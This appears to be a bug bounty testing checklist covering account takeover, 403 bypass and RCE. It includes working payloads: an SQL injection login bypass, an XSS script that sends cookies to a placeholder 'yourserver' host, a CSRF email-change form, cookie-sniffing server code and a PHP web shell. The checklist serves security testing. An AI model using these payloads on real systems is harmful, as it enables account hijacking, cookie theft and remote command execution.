# Bugbounty Checklist

## Account Takeover Checklist

- login:
    - [ ] Try registering any email address without verifying it and then tries to login with same email using any other sigh in method
    - [ ] check if you are able to brute force the password
    - [ ] Check for account takeover due to improper rate limit
    - [ ] Test for OAuth misconfigurations
    - [ ]
    - [ ] check if you are able to bruteforce the login OTP

    - [ ] check for JWT mesconfigurations

    - [ ] Test for SQL injection to bypass authentication

        ```admin" or 1=1;--```
    - [ ] check if the application validates the OTP or Token

- password reset:
    - [ ] check if you are able to brute force the password reset OTP

    - [ ] test for token predectability

    - [ ] test for JWT misconfigurations

    - [ ] check if the password reset endpoint is vulnerable to IDOR

    - [ ] check if the password reset endpoint is vulnerable to Host Header injection

    - [ ] check if the password reset endpoint is leaking the token or OTP in the HTTP response

    - [ ] check if the application validates the OTP or Token
    
    - [ ] test for HTTP parameter Pollution (HPP)
    

- XSS to Account Takeover
    - [ ] if the application does not use auth token or you can't access the cookies because the "HttpOnly" flag, you can obtain the CSRF token and craft a request to change the user's email or password       

    - [ ] try to exfiltrate the cookies

    - [ ] try to exfiltrate the Auth Token

    - [ ] if the cookie's "domain" attribute is set, search for xss in the subdomains and use it to exfiltrate the cookies

    - PoC Example:
        ```html
        <script>
            /*
            this script will create a hidden <img> element
            when the browser tries to load the image
            the victim's cookies will be sent to your server
            */

            var new_img = document.createElement('img');
            new_img.src = "http://yourserver/" + document.cookie;
            new_img.style = 'display: none;'
            document.body.appendChild(new_img);
        </script>

        ```

- CSRF to Account Takeover

    - [ ] check if the email update endpoint is vulnerable to CSRF

    - [ ] check if the password change endpoint is vulnerable to CSRF

    - PoC Example:
        ```html
            <html>
                <head>
                    <title>CSRF PoC</title>    
                <head>
                <body>
                    <form name='attack' action='https://example.com/update-email' method='POST'>
                        <input type="hidden" name="new_email" value="attacker@evil.com">
                        <input type="submit" name="submit" value="submit" hidden>
                    <form>
                    <script>
                        document.attack.submit.click()
                    </script>
                </body>
            </html>
        ```

- IDOR to Account Takerover

    - [ ] checck if the email update endpoint is vulnerable to IDOR

    - [ ] check if the password change endpoint is vulnerable to IDOR

    - [ ] check if the password reset endpoint vulnerable to IDOR

- subdomain takeover:
    - [ ] first-order: check if you can takeover xyz.example.com, you can host any malicious code to steal users info or cookies
    - PoC Example
        ```python
        #!/usr/bin/python3
        from flask import *

        app = Flask(__name__)

        @app.route('/')
        def cookie_sniffer():
            for c_name, c_value in request.cookies.items():
                print(c_name + ': ' + c_value)
            return 'Hello, world'
        if __name__ == '__main__':
            app.run(port=80)
        ```
    - [ ] second-order (broken link hijacking): if you found a broken link in a webpage (https://nonexistentlink.com/app.js) and you can takeover this domain, you can host any malicious javascript file and use it to steal users info or cookies
    - PoC Example
        ```javascript
        user_cookies = {
            "cookies": document.cookie
        }

        var xhttp = new XMLHttpRequest();
        xhttp.open("POST", "/store-cookies", true);
        xhttp.send(JSON.stringify(user_cookies));
        ```

# 403 Bypass



## FFUF

- [ ] Path fuzzing

```bash
ffuf -w 403_url_payloads.txt -u http://example.com/auth_pathFUZZ -fc 403,401,400
```



- [ ] HTTP Header Fuzzing

```bash
ffuf -w 403_bypass_header_names.txt:HEADER -w 403_bypass_header_values.txt:VALUE -u http://example.com/auth_path -H "HEADER:VALUE" -fc 403,401,400
```



- [ ] Common HTTP Ports Fuzzing

```bash
ffuf -w common-http-ports.txt:PORT -u http://example.com/auth_path -H "Host: example.com:PORT" -fc 403,401,400
```



- [ ] HTTP Methods Fuzzing

```bash
ffuf -w http-methods.txt:METHOD -u http://example.com/auth_path -X "METHOD" -fc 403,401,400
```



- [ ]  User Agent Fuzzing

```bash
ffuf -w user-agents.txt:AGENT -u http://example.com/auth_path -H "User-Agent: AGENT" -fc 403,401,400
```



## nuclei

```bash
nuclei -u http://example.com/auth_path/ -t 403-bypass-nuclei-templates -tags fuzz -timeout 10 -c 200 -v
```

**Note**: Add the slash symbol after the path whether it is a directory or file

Example:

- http://example.com/directory/
- http://example.com/directory/file.ext/

### Sources

- https://docs.google.com/presentation/d/1ek6DzXKBQd6xUiVNGRT33pMACs8M13CSoYCkgepDKZk/edit#slide=id.gaa5321e139_0_0
- https://github.com/Karanxa/Bug-Bounty-Wordlists/blob/main/403_header_payloads.txt
- https://github.com/Karanxa/Bug-Bounty-Wordlists/blob/main/403_url_payloads.txt
- https://github.com/iamthefrogy/frogy/blob/main/ports
- https://annevankesteren.nl/2007/10/http-methods
- https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/User-Agents/UserAgents.fuzz.txt


## Remote Code/Command Execution (RCE) Checklist



- Server Side Request Forgery (SSRF) to RCE:

  - [ ] if you found an SSRF try to escalate it to RCE by interacting with internal services, to do this you can craft a Gopher payload to interact with services like MySQL, you can use [Gopherus](https://github.com/tarunkant/Gopherus)

- File Upload to RCE:

  - [ ] if you found an unrestricted file upload vulnerability try to upload a malicious file to get a reverse shell

    ```php
    <?php system($_GET["cmd"]);?>
    ```

- Dependency Confusion Attack:

  - [ ] Search for packages that may be used internally by your target, then register a malicious public package with the same name, you can use [confused](https://github.com/visma-prodsec/confused) tool

- Server Side Template Injection (SSTI) to RCE:

  - [ ] if you found and SSTI you can exploit it with [tplmap](https://github.com/epinna/tplmap) to get an RCE

- SQL Injection To RCE:

  - [ ] if you found an SQL injection, you can craft a special query to write an arbitrary file on the system, [SQL Injection shell](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#shell)

- Latex Injection To RCE:

  - [ ] if you found a web-based Latex Compiler, test If it is vulnerable to RCE, Latex to [command execution](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection#command-execution)

- Local File Inclusion (LFI) to RCE:

  - [ ] if you found an LFI try to escalate it to RCE via these [methods](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-procfd) and you can automate the process using [liffy](https://github.com/mzfr/liffy)

- Insecure deserialization to RCE:

  - [ ] check if the application is vulnerable to Insecure deserialization
  - [ ] how to identify if the app is vulnerable:
    - try to find out the language used to build the application
    - learn about the methods used to serialize and deserialize data in this language
    - by analyzing the data that comes from the application you can identify the method
    - try to craft a special payload to get and RCE
  - [ ] check this [cheatsheet](https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html) 
  - [ ] [Java Deserialization Scanner](https://github.com/PortSwigger/java-deserialization-scanner) : a Burp Suite plugin to detect and exploit Java deserialization vulnerabilities

## OSINT tips for penetration testing 

  - [ ] Searching pieces of code of that website on github 
  - [ ] Using gitleaks
  - [ ] try to search for “http://” or “https://” in organization's repository
  - [ ] 
  - [ ]
  - [ ]
